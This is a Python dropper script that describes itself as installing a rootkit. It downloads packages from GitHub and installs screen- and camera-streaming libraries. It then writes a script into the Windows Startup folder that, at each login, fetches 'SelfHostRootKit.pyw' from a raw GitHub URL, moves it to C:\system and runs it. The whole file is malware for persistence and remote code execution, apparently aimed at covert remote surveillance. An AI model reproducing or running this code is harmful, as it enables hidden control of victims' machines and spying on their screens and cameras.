# ! create file in C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup and C:/system #
from os import remove, chdir, system, getcwd, path
from shutil import move, rmtree
from time import sleep
from zipfile import ZipFile
from requests import get
from subprocess import Popen
githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
try:
    import easyimporting
except:
    system("pip install easyimporting")
    system('dl.py')
    exit()
def unzipfile(file=".zip"):
    # open ZIP file in read mode
    with ZipFile(file, 'r') as zip: 
        # extract all files
        zip.extractall() 
    remove(file)
def downloadFileGithub(file_url, data=".zip"):
    with open(data,"wb") as zip	: 
        for chunk in (get(file_url, stream = True)).iter_content(chunk_size=1024): 
             # writing one chunk at a time to zip file 
             if chunk: zip.write(chunk)
    unzipfile()
def moveFileFromDir(data, file):
    if type(file)==str:
        file = file.split()
    for f in range(len(file)):
        if file[f] != path.basename(__file__):
            move(getcwd().replace('\\', '/')+"/"+data+"/"+file [f], getcwd().replace('\\', '/'))

try:
    from vidstream import ScreenShareClient, CameraClient
    raise Exception
except:
    dir = "whl-main"
    downloadFileGithub("https://github.com/N0SAFE/whl/archive/refs/heads/main.zip")
    Popen("py -m pip install whl-main/PyAudio-0.2.11-cp39-cp39-win_amd64.whl", shell=True)
    rmtree("whl-main")
    Popen("py -m pip install vidstream", shell=True)
    remove("PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
    
exit()
try:
    import pyautogui, socket, lib_platform, pyaudio
except:
    easyimporting.importing("pyautogui lib_platform")
    system('dl.py')
    exit()

with open('lancement.pyw', 'w') as file:
    file.write("""
from os import remove, chdir, mkdir
from urllib.request import urlopen
from shutil import move
from subprocess import Popen
with open("SelfHostRootKit.pyw", 'w'):
    pass
with open("SelfHostRootKit.pyw", "a") as file:
    file.write((urlopen('https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/SelfHostRootKit.pyw')).read().decode())
try:
    remove("C:\system/SelfHostRootKit.pyw")
except:
    pass
try:
    mkdir('C:\system')
except:
    pass
move('SelfHostRootKit.pyw', 'C:\system')
chdir("C:\system")
Popen("start SelfHostRootKit.pyw", shell=True)""")
try:
    remove("C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup/lancement.pyw")
except:
    pass
move('lancement.pyw', 'C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
chdir('C:/Users/admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
system('start lancement.pyw')
